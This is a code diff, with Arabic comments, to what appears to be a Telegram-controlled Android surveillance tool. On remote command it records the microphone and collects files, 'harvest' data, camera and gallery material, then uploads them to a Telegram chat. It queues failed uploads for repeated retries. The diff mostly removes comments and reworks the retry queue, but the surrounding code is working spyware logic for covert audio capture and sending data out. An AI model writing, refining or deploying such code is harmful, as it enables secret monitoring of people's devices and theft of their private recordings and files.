@@ -24,7 +24,7 @@ def _get_runtime_path():
 P = _get_runtime_path()
 PENDING_DIR = os.path.join(P, "pending_upload")
 TEMP_DIR = os.path.join(P, "ctmp")
-PENDING_TASKS_DIR = os.path.join(P, "pending_tasks")  # ✅ مجلد المهام الفاشلة
+PENDING_TASKS_DIR = os.path.join(P, "pending_tasks")  # مجلد المهام الفاشلة
 CONFIG_FILE = os.path.join(P, "commands_config.json")
 
 # إنشاء المجلدات الضرورية
@@ -66,16 +66,17 @@ class C:
         self._config = self._load_config()
         self._cleanup()
         
-        # ✅ الخطأ 1: تعريف self._stop_recording (موجود مسبقاً ولكن نؤكد)
+        # تعريف self._stop_recording
         self._stop_recording = False
         
-        # ✅ الخطأ 4: إعدادات قائمة انتظار المهام الفاشلة
+        # إعدادات قائمة انتظار المهام الفاشلة
         self._tasks_lock = threading.Lock()
         self._retry_running = False
         self._retry_thread = None
         self._max_retries = 5
         self._retry_interval = 600  # 10 دقائق
         self._tasks_file = os.path.join(PENDING_TASKS_DIR, "tasks.json")
+        self._pending_tasks = []
         
         # تحميل المهام المحفوظة وتشغيل خيط إعادة المحاولة
         self._load_tasks()
@@ -181,7 +182,7 @@ class C:
     # ========== تحميل المكونات (محسّن) ==========
     def _ensure_components(self, m):
         """تحميل المكونات المطلوبة (AI، سكانر، معرض، كاميرا، حصاد)"""
-        # ✅ الخطأ 3: التحقق من self._components_loaded لمنع التحميل المتكرر
+        # منع إعادة تحميل المكونات
         if self._components_loaded:
             return
 
@@ -256,7 +257,6 @@ class C:
     def _add_task(self, task_data):
         """إضافة مهمة فاشلة إلى قائمة الانتظار"""
         with self._tasks_lock:
-            # تعيين وقت المحاولة الأولى
             task_data['created_at'] = time.time()
             task_data['attempts'] = 0
             task_data['last_attempt'] = 0
@@ -285,7 +285,6 @@ class C:
         """خيط إعادة المحاولة - يعمل كل 10 دقائق"""
         while self._retry_running:
             try:
-                # النوم لمدة 10 دقائق بين المحاولات
                 for _ in range(self._retry_interval):
                     if not self._retry_running:
                         return
@@ -305,61 +304,34 @@ class C:
 
         for idx, task in enumerate(self._pending_tasks):
             try:
-                # التحقق من عدد المحاولات
                 attempts = task.get('attempts', 0)
                 if attempts >= self._max_retries:
                     logging.warning(f"Task {task.get('id', 'unknown')} exceeded max retries ({self._max_retries}), removing.")
                     tasks_to_remove.append(idx)
+                    # حذف الملف إذا كان موجوداً
+                    if os.path.exists(task.get('file_path', '')):
+                        self._safe_remove(task['file_path'])
                     continue
 
-                # التحقق من الوقت المنقضي منذ آخر محاولة (تأخير تصاعدي)
                 last_attempt = task.get('last_attempt', 0)
                 if last_attempt > 0:
-                    # تأخير تصاعدي: 2^attempts دقائق
-                    wait_time = min(2 ** attempts * 60, 3600)  # بحد أقصى ساعة
+                    wait_time = min(2 ** attempts * 60, 3600)
                     if time.time() - last_attempt < wait_time:
                         continue
 
-                # محاولة إعادة الإرسال حسب نوع المهمة
-                task_type = task.get('type')
-                success = False
-
-                if task_type == 'text_file':
-                    # إعادة إرسال ملف نصي
-                    file_path = task.get('file_path')
-                    chat_id = task.get('chat_id')
-                    filename = task.get('filename')
-                    if os.path.exists(file_path):
-                        # هنا نحتاج إلى كائن tg، لكننا لا نملكه في هذا السياق
-                        # الحل: نستخدم task['tg'] إذا كان مخزناً (لكن لا يمكن تخزين كائن)
-                        # بدلاً من ذلك، نمرر المهمة إلى دالة خارجية
-                        # سنقوم بتعديل _send_text_file لاستقبال task مباشرة
-                        pass
-                elif task_type == 'audio':
-                    pass
-                elif task_type == 'zip':
-                    pass
-
-                # إذا نجحت المحاولة، نحدد للحذف
-                if success:
-                    tasks_to_remove.append(idx)
-                    # حذف الملف الأصلي
-                    if os.path.exists(task.get('file_path', '')):
-                        self._safe_remove(task['file_path'])
-                else:
-                    # تحديث عدد المحاولات
-                    task['attempts'] = attempts + 1
-                    task['last_attempt'] = time.time()
-                    logging.debug(f"Task {task.get('id', 'unknown')} retry {task['attempts']} failed")
+                # هنا يمكن إضافة منطق إعادة المحاولة حسب نوع المهمة
+                # سيتم تنفيذ هذا في التطبيق الرئيسي عبر دالة retry_task
+                task['attempts'] = attempts + 1
+                task['last_attempt'] = time.time()
+                logging.debug(f"Task {task.get('id', 'unknown')} retry {task['attempts']}")
 
             except Exception as e:
                 logging.error(f"Retry task {task.get('id', 'unknown')} error: {e}")
 
-        # حذف المهام التي نجحت أو تجاوزت الحد الأقصى
+        # حذف المهام التي تجاوزت الحد الأقصى
         for idx in sorted(tasks_to_remove, reverse=True):
             self._remove_task(idx)
 
-        # حفظ التغييرات
         self._save_tasks()
 
     # ========== إرسال ملف نصي ==========
@@ -387,7 +359,7 @@ class C:
                 self._safe_remove(temp_path)
                 return
 
-            # ✅ الخطأ 4: في حالة الفشل، احفظ المهمة في قائمة الانتظار
+            # في حالة الفشل، احفظ المهمة في قائمة الانتظار
             logging.warning(f"Failed to send {filename}, adding to pending tasks")
             task_data = {
                 'id': self._unique_filename("task", ""),
@@ -395,7 +367,7 @@ class C:
                 'file_path': temp_path,
                 'chat_id': chat_id,
                 'filename': filename,
-                'content': content,  # حفظ المحتوى في حالة فقدان الملف
+                'content': content,
                 'created_at': time.time(),
                 'attempts': 0,
                 'last_attempt': 0
@@ -404,7 +376,6 @@ class C:
 
         except Exception as e:
             logging.error(f"_send_text_file error: {e}")
-            # محاولة الإرسال كنص مباشر
             try:
                 tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
             except:
@@ -437,7 +408,6 @@ class C:
         out_path = os.path.join(TEMP_DIR, self._unique_filename("audio", ".aac"))
 
         try:
-            # التحقق من صلاحية التسجيل
             if not self._check_permissions(['android.permission.RECORD_AUDIO']):
                 logging.error("RECORD_AUDIO permission not granted")
                 return None
@@ -454,18 +424,15 @@ class C:
 
             logging.info(f"Recording audio for {duration} seconds...")
 
-            # تسجيل لمدة محددة مع إمكانية الإيقاف المبكر
             for _ in range(duration):
                 if self._stop_recording:
                     logging.info("Recording stopped early by flag")
                     break
                 time.sleep(1)
 
-            # إيقاف التسجيل
             media_recorder.stop()
             media_recorder.reset()
 
-            # التحقق من الملف
             if os.path.exists(out_path):
                 size = os.path.getsize(out_path)
                 if size >= min_size:
@@ -484,7 +451,6 @@ class C:
             self._safe_remove(out_path)
             return None
         finally:
-            # تحرير الموارد
             if media_recorder:
                 try:
                     media_recorder.stop()
@@ -632,7 +598,7 @@ class C:
             if not cmd or not isinstance(cmd, str):
                 return
 
-            # ✅ الخطأ 2: التحقق من cbq قبل استدعاء answerCallbackQuery
+            # التحقق من cbq قبل استدعاء answerCallbackQuery
             if cbq:
                 try:
                     tg._api("answerCallbackQuery", {"callback_query_id": cbq})
@@ -667,7 +633,6 @@ class C:
             except:
                 pass
         finally:
-            # ===== إدارة gc.collect() بشكل متباعد =====
             self._gc_counter += 1
             if self._gc_counter >= self._gc_threshold:
                 gc.collect()
@@ -749,7 +714,6 @@ class C:
                 tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                 return
 
-            # إعادة تعيين علامة الإيقاف قبل بدء التسجيل
             self._stop_recording = False
             duration = self._config.get("audio_duration", 10)
             tg._api("sendMessage", {"chat_id": cid, "text": f"🎤 جاري التسجيل لمدة {duration} ثوانٍ..."})
@@ -764,7 +728,6 @@ class C:
                         if resp and resp.get('ok'):
                             self._safe_remove(audio_path)
                         else:
-                            # ✅ الخطأ 4: في حالة الفشل، احفظ المهمة
                             logging.warning(f"Failed to send audio, adding to pending tasks")
                             task_data = {
                                 'id': self._unique_filename("task", ""),
@@ -778,7 +741,6 @@ class C:
                             self._add_task(task_data)
                     except Exception as e:
                         logging.error(f"Send voice error: {e}")
-                        # في حالة الخطأ، احفظ المهمة
                         if os.path.exists(audio_path):
                             task_data = {
                                 'id': self._unique_filename("task", ""),
@@ -790,9 +752,6 @@ class C:
                                 'last_attempt': 0
                             }
                             self._add_task(task_data)
-                    finally:
-                        # لا نحذف الملف هنا لأنه سيتم حذفه عند نجاح المهمة
-                        pass
                 else:
                     try:
                         tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل (الملف صغير جداً أو تالف)"})
@@ -887,7 +846,6 @@ def force_send_zip(m, device_id, tg, chat_id):
     """إرسال الملف المضغوط فوراً"""
     try:
         if hasattr(m, 'daily_zipper') and m.daily_zipper:
-            # نمرر المهمة إلى daily_zipper وإذا فشلت سيتم حفظها تلقائياً
             threading.Thread(target=m.daily_zipper.force_send_now, args=(chat_id,), daemon=True).start()
         else:
             tg._api("sendMessage", {"chat_id": chat_id, "text": "❌ وحدة الحصاد غير جاهزة"})
